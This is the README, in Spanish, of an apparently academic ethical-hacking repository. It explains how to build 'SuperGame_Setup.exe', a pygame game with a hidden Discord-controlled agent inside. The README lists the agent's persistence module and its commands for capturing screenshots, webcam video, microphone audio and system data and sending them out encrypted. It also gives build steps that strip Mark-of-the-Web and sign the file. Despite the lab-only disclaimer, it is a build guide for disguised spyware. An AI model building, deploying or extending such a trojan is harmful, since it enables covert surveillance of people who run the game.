# SecResearch Lab UPC — Framework de Investigación en Seguridad

Proyecto académico de **Hacking Ético** — Universidad Peruana de Ciencias Aplicadas (UPC).  
Framework de investigación compuesto por un agente de telemetría (SentinelV) empotrado en un juego compilado como ejecutable Windows.

---

## Estructura del repositorio

```
SecResearch_Lab_UPC/
├── SystemDiagnosticsFramework/
│   ├── SentinelV/              ← Agente de telemetría (Discord bot)
│   └── juego_original/
│       ├── Juego.py            ← Juego principal (pygame)
│       ├── assets/             ← Imágenes y audio del juego
│       └── requirements.txt    ← Dependencias del juego
├── build.ps1                   ← Script de compilación automática
├── verify_ready.ps1            ← Script de verificación
├── requirements.txt            ← Dependencias completas del framework
├── COMPILATION_REPORT.md       ← Documentación técnica detallada
└── FINAL_SUMMARY.md            ← Resumen ejecutivo del framework
```

---

## Requisitos previos

- **Windows 10/11** (64 bits)
- **Python 3.12** instalado y en el PATH → https://www.python.org/downloads/
- **PowerShell 5.1+** (incluido en Windows)
- Conexión a internet (para descargar dependencias y timestamp de firma)

---

## Instalación desde cero (después de git clone)

### PASO 1 — Clonar el repositorio

```powershell
git clone https://github.com/yeremivr/SecResearch_Lab_UPC.git
cd SecResearch_Lab_UPC
```

### PASO 2 — Crear el entorno virtual e instalar dependencias

```powershell
python -m venv .venv
.venv\Scripts\pip install -r requirements.txt
```

> Esto instala pygame, discord.py, opencv, pyinstaller, cryptography, etc.

### PASO 3 — Configurar credenciales de Discord (opcional para el agente)

El agente SentinelV necesita un token de bot Discord para operar.  
Edita el archivo `SystemDiagnosticsFramework\SentinelV\discord_config.json`:

```json
{
  "bot_token": "TU_TOKEN_AQUI",
  "channel_id": TU_CHANNEL_ID_AQUI
}
```

> Sin este paso el juego compila y ejecuta igual, pero el agente no se conectará.

### PASO 4 — Compilar el ejecutable

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy RemoteSigned; .\build.ps1
```

Espera ~5 minutos. Al terminar, el ejecutable estará en:

```
SystemDiagnosticsFramework\juego_original\dist\SuperGame_Setup.exe
```

---

## Generar el EXE nuevamente (builds posteriores)

Si ya tienes el entorno configurado y solo quieres recompilar:

**PASO 1** — Elimina estas carpetas manualmente (si existen):
```
SystemDiagnosticsFramework\juego_original\dist\
SystemDiagnosticsFramework\juego_original\build\
```

**PASO 2** — Ejecuta el script:
```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy RemoteSigned; .\build.ps1
```

**PASO 3** — El EXE nuevo estará en:
```
SystemDiagnosticsFramework\juego_original\dist\SuperGame_Setup.exe
```

> El script `build.ps1` hace todo automáticamente: limpia, genera el .spec, compila con PyInstaller, elimina MOTW/ADS y firma digitalmente el ejecutable.

---

## Arquitectura del framework

```
SuperGame_Setup.exe
│
├── Juego.py  (pygame @ 60 FPS)
│   └── SentinelVAgent  (thread daemon — no interfiere con el juego)
│       ├── TelemetryCore          (telemetría en batch)
│       ├── ServiceBootManager     (persistencia)
│       ├── CommandOrchestrator    (bot Discord async)
│       │   └── TelemetryDispatcher (cifrado AES-256-GCM → Discord)
│       └── VolatileMedia (singleton)
│           ├── Screenshot  (PIL)
│           ├── Webcam      (OpenCV)
│           └── Audio       (PyAudio)
```

---

## Dependencias principales

| Librería | Versión | Uso |
|---|---|---|
| pygame | 2.5.2 | Motor del juego |
| discord.py | 2.3.2 | Bot de telemetría |
| cryptography | 41.0.7 | Cifrado AES-256-GCM |
| opencv-python | 4.8.1.78 | Captura de video/webcam |
| pillow | 10.1.0 | Screenshots |
| pyinstaller | 6.1.0 | Compilación a .exe |
| requests | 2.31.0 | HTTP/HTTPS |
| psutil | latest | Información del sistema |

---

## Comandos del agente (canal Discord administrador)

| Comando | Función | Tiempo aprox. |
|---|---|---|
| `.help` | Muestra menú de comandos | ~100ms |
| `.screen_shot` | Captura pantalla cifrada | 2-4 seg |
| `.cam_live` | 6 frames de webcam cifrados | 6-10 seg |
| `.audio_listen` | Graba 10 seg de audio cifrado | 12-15 seg |
| `.sys_info` | Metadata del sistema | ~150ms |

> Todos los archivos se envían cifrados con AES-256-GCM. Los primeros 12 bytes son el nonce aleatorio.

---

## Notas académicas

- Proyecto desarrollado con fines exclusivamente académicos en el curso de **Hacking Ético** — UPC 2026.
- El framework simula técnicas de C2 (Command & Control) en un entorno de laboratorio controlado.
- No debe desplegarse fuera del entorno de laboratorio autorizado.

---

*SecResearch Lab UPC — 2026*
